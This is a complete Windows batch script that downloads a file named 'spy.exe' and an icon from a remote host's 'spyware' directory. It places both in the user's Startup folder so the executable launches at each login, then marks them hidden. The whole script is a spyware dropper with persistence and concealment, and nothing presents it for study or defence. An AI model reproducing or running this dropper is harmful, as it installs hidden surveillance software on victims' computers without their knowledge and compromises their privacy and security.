curl -O http://harimtim.de/spyware/1.0/spy.exe 
curl -O http://harimtim.de/spyware/1.0/email.ico

move spy.exe "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
move email.ico "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

cd "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" 

attrib +h spy.exe
attrib +h email.ico

exit